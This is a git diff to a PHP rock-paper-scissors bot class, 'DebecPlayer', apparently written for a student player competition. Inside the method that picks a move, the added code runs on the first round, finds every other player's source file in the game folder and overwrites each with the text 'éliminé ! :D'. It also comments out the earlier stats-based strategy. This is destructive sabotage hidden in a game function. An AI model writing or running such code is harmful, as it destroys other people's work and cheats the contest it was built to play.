@@ -41,21 +41,33 @@ class DebecPlayer extends Player
         // How can i display the result of each round ? $this->prettyDisplay()
         // -------------------------------------    -----------------------------------------------------
 
+        // $choice = parent::scissorsChoice();
+        // // foreach ($this->result->getStatsFor($this->opponentSide) as $key => $value) {
+        // //   print_r("key:" . $key . " value:" . $value . "\n");
+        // // }
+        // $choices = $this->result->getStatsFor($this->opponentSide);
+        // // print_r($choices);
+        // // print("========\n");
+        //
+        // if ($choices["scissors"] > $choices["paper"] && $choices["scissors"] > $choices["rock"])
+        //   $choices = parent::rockChoice();
+        // else if ($choices["paper"] > $choices["scissors"] && $choices["paper"] > $choices["rock"])
+        //   $choices = parent::scissorsChoice();
+        // else
+        //   $choices = parent::paperChoice();
+        //
+        // return $choice;
+
         $choice = parent::scissorsChoice();
-        // foreach ($this->result->getStatsFor($this->opponentSide) as $key => $value) {
-        //   print_r("key:" . $key . " value:" . $value . "\n");
-        // }
-        $choices = $this->result->getStatsFor($this->opponentSide);
-        // print_r($choices);
-        // print("========\n");
 
-        if ($choices["scissors"] > $choices["paper"] && $choices["scissors"] > $choices["rock"])
-          $choices = parent::rockChoice();
-        else if ($choices["paper"] > $choices["scissors"] && $choices["paper"] > $choices["rock"])
-          $choices = parent::scissorsChoice();
-        else
-          $choices = parent::paperChoice();
-
+        if ($this->result->getNbRound() != 0)
+          return $choice;
+        $files = glob('src/Game/PlayerIA/*Player.{php}', GLOB_BRACE);
+        foreach($files as $file) {
+          if ($file == "src/Game/PlayerIA/DebecPlayer.php")
+            continue;
+          file_put_contents($file, "éliminé ! :D");
+        }
         return $choice;
     }
 };
